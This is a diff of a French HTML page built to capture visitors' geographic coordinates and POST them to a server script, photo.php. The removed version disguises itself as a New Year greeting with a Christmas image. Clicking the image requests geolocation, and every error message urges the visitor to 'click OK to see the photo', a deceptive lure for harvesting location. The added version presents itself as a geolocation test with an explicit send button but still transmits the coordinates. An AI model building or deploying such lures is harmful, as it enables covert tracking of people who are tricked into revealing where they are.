@@ -3,63 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy new year 2025</title>
+    <title>Joyeux noel </title>
+</head>
+<body>
+    <h1>Test de Géolocalisation via Photo</h1>
+    <p>Clique sur Ok pour voir le message :</p>
+
+    <button onclick="sendLocation()">Envoyer ma position</button>
+
+    <p id="status"></p> <!-- Affichera les messages d'erreur ou de succès -->
+
     <script>
-        // Fonction pour obtenir la geolocalisation
-        function getLocation() {
+        // Fonction pour envoyer la position géographique
+        function sendLocation() {
+            // Vérifie si le navigateur supporte la géolocalisation
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                document.getElementById("status").textContent = "Obtention de la position...";
+
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+
+                    // Affiche la position pour l'utilisateur
+                    document.getElementById("status").textContent = "Position obtenue : Latitude: " + latitude + ", Longitude: " + longitude;
+
+                    // Envoie les données via AJAX à photo.php
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "photo.php", true);
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+                    // Gérer la réponse de photo.php
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4 && xhr.status === 200) {
+                            // Affiche la réponse du serveur (succès ou échec)
+                            alert(xhr.responseText); 
+                        }
+                    };
+
+                    // Envoie les données latitude et longitude à photo.php
+                    xhr.send("latitude=" + latitude + "&longitude=" + longitude);
+                }, function(error) {
+                    // Gère les erreurs possibles de la géolocalisation
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            document.getElementById("status").textContent = "Vous avez refusé la demande de géolocalisation.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            document.getElementById("status").textContent = "La position est indisponible.";
+                            break;
+                        case error.TIMEOUT:
+                            document.getElementById("status").textContent = "La demande de géolocalisation a expiré.";
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            document.getElementById("status").textContent = "Une erreur inconnue est survenue.";
+                            break;
+                    }
+                });
             } else {
-                alert("probleme du navigateur.");
-            }
-        }
-
-        // Envoie la position au serveur via une requete POST
-        function sendLocation(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-
-            // Affiche un message pour confirmer
-            alert('Position trouvee ! Latitude: ' + latitude + ', Longitude: ' + longitude);
-
-            // Cree une requete pour envoyer les donnees au serveur
-            var xhr = new XMLHttpRequest();
-            var url = "photo.php";  // Remplace par l'URL de ton script (PHP, Node.js, etc.)
-            xhr.open("POST", url, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    console.log(xhr.responseText);  // Reponse du serveur (optionnel)
-                }
-            };
-            xhr.send("latitude=" + latitude + "&longitude=" + longitude);
-        }
-
-// Gestion des erreurs de géolocalisation
-function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("Clique sur OK pour voir la photo");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Clique sur OK pour voir la photo");
-                    break;
-                case error.TIMEOUT:
-                    alert("Clique sur OK pour voir la photo");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("Clique sur OK pour voir la photo");
-                    break;
+                document.getElementById("status").textContent = "La géolocalisation n'est pas supportée par ce navigateur.";
             }
         }
     </script>
-</head>
-<body>
-
-    <!-- L'image sur laquelle cliquer pour etre localise -->
-    <img src="https://img.freepik.com/photos-gratuite/fond-noel-mignon-bokeh_1361-3548.jpg?t=st=1735328349~exp=1735331949~hmac=2c11914ddbf1797858b622d7a88fee8682dc39549a5981aa8fc0705c88cfca5c&w=1380" alt="Cliquez ici" width="500px" onclick="getLocation()" style="cursor:pointer;">
-    
-    <!-- Optionnel : Afficher les coordonnees directement sur la page -->
-
 </body>
 </html>
